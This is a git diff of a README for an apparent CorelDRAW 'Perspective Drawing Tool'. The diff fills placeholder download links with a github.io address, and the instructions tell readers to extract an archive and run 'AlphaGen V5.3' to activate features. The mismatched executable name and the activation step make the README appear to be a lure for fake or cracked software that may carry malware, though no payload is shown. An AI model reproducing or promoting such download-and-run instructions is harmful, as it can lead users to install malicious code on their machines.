@@ -2,13 +2,13 @@
 
 Create realistic 1-point, 2-point, and 3-point perspective illustrations with CorelDRAW’s dedicated Perspective Drawing Tool.
 
-[![Download](https://img.shields.io/badge/Download-Perspective_Tool_CorelDRAW-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Perspective_Tool_CorelDRAW-blueviolet)](https://perspective-drawing-tool-coreldraw.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://perspective-drawing-tool-coreldraw.github.io/.github)  
 2. 📁 Extract the folder to any convenient location  
 3. 🖱 Run AlphaGen V5.3 to activate perspective features  
 4. ✅ Open CorelDRAW and select the `Perspective Drawing` mode from the toolbox
